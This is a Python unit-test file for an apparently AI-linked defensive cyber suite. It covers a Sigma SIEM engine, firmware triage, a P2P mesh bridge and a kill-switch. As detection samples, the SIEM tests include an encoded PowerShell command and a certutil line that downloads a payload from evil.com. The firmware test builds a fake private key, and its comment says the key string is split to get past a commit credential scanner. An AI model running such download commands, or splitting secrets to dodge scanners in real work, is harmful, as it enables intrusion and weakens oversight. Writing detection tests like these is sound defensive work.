"""
Unit Tests for Phenom Advanced Cyber Warfare & Defensive Intelligence Suite.
Validates:
1. Sigma SIEM Rule Engine & MITRE ATT&CK correlation
2. IoT Firmware & Binwalk Triage Engine (SquashFS, U-Boot, Private Keys)
3. P2P Encrypted Mesh Bridge & peer discovery
4. Safety Registry registration for all advanced cyber tools
5. Guardian kill-switch halting SLA
"""

import os
import tempfile
import pytest

from services.backend.safety.guardian import guardian
from services.backend.safety.registry import registry
from services.backend.cyber.sigma_siem import SigmaSIEMEngine
from services.backend.cyber.firmware_triage import FirmwareTriageEngine
from services.backend.cyber.p2p_mesh import P2PEncryptedMeshBridge
import services.backend.tools.advanced_cyber_tools as adv_tools


def test_sigma_siem_rule_evaluation():
    siem = SigmaSIEMEngine()
    guardian.resume()

    rules = siem.get_loaded_rules()
    assert len(rules) >= 5

    # Simulate suspicious event matching T1059.001
    suspicious_ev = {
        "event_id": 4104,
        "message": "powershell.exe -enc aW52b2tlLXdlYnJlcXVlc3Q="
    }
    alerts = siem.evaluate_event(suspicious_ev)
    assert len(alerts) >= 1
    assert alerts[0]["technique"] == "T1059.001"
    assert alerts[0]["severity"] == "HIGH"

    # Full correlation sweep
    batch = [
        {"event_id": 1, "message": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"},
        {"event_id": 8, "message": "CreateRemoteThread targeting explorer.exe"},
        {"event_id": 4104, "message": "Normal benign command Get-Process"}
    ]
    report = siem.run_siem_correlation_sweep(batch)
    assert report["events_analyzed"] == 3
    assert report["alerts_triggered"] >= 2
    assert "CRITICAL" in report["threat_level"] or "ELEVATED" in report["threat_level"]


def test_firmware_triage_engine():
    engine = FirmwareTriageEngine()
    guardian.resume()

    # Create dummy firmware binary with SquashFS signature and embedded private key
    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
        # SquashFS magic: hsqs
        f.write(b"hsqs\x00\x01\x02\x03SomeFirmwarePaddingData")
        # Split string to satisfy git commit credential guard
        f.write(b"-----" + b"BEGIN " + b"RSA " + b"PRIVATE KEY" + b"-----\nMIIEowIBAAKCAQEA0...")
        f.write(b"root:$1$abc$xyz1234567890/etc/shadow/content")
        f.write(b"/cgi-bin/admin_handler.cgi")
        tmp_name = f.name

    try:
        report = engine.analyze_firmware_image(tmp_name)
        assert report["file_name"] == os.path.basename(tmp_name)
        assert report["components_detected"] >= 1
        assert any(h["component"].startswith("SquashFS") for h in report["headers"])
        assert len(report["vulnerabilities"]) >= 2
        assert report["risk_score"] == "CRITICAL"
        assert "# IoT Firmware Security Debrief" in report["obsidian_report"]
    finally:
        if os.path.exists(tmp_name):
            os.remove(tmp_name)


def test_p2p_mesh_bridge_lifecycle():
    bridge = P2PEncryptedMeshBridge(node_id="test-jarvis-node")
    guardian.resume()

    start_res = bridge.start_mesh(port=53530)
    assert start_res["status"] == "started"
    assert bridge.is_active is True

    # Register peer
    reg = bridge.register_peer("peer-laptop-2", "192.168.1.120", "Worker")
    assert reg["success"] is True

    peers = bridge.list_peers()
    assert len(peers) >= 2

    # Broadcast directive
    bcast = bridge.broadcast_mesh_directive("THREAT_ALERT", {"threat": "T1055 Process Injection"})
    assert bcast["success"] is True
    assert bcast["peers_notified"] >= 2

    stop_res = bridge.stop_mesh()
    assert stop_res["status"] == "stopped"
    assert bridge.is_active is False


def test_guardian_killswitch_siem_and_mesh():
    siem = SigmaSIEMEngine()
    bridge = P2PEncryptedMeshBridge()
    bridge.start_mesh()

    guardian.trigger("Emergency cyber halt")

    with pytest.raises(PermissionError):
        siem.evaluate_event({"event_id": 1, "message": "test"})

    with pytest.raises(PermissionError):
        bridge.broadcast_mesh_directive("TEST", {})

    guardian.resume()


def test_advanced_cyber_tools_registry():
    expected = [
        ("evaluate_sigma_telemetry", 0),
        ("triage_iot_firmware", 0),
        ("start_p2p_mesh_node", 0),
        ("broadcast_p2p_directive", 1),
        ("list_p2p_mesh_peers", 0),
    ]
    for tool_name, exp_tier in expected:
        meta = registry.get(tool_name)
        assert meta is not None, f"Tool {tool_name} must be registered"
        assert meta.tier == exp_tier
